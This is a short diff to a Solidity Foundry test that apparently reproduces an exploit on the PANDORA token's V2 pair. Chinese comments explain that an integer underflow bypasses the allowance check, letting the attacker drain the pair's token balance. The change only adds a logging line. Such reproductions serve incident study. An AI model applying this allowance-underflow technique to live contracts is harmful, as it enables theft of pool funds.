@@ -44,6 +44,7 @@ contract ContractTest is Test {
         // 第二次transferFrom发生之后，pair中pandora_balance增加，pandora_reserve不变，所以增加的这部分(pandora_balance - pandora_reserve)算在了攻击者头上，则获利
 
         // 发生整数移除，使得msg.sender无需授权，即可使以下函数调用通过allowance检查
+        console.log("Before first transferFrom, pandora token amounts:",PANDORA.balanceOf(address(this)));
         PANDORA.transferFrom(address(V2_PAIR), address(PANDORA), pandora_balance - 1);
         V2_PAIR.sync();
         (uint256 ethReserve, uint256 oldPANDORAReserve, ) = V2_PAIR.getReserves();
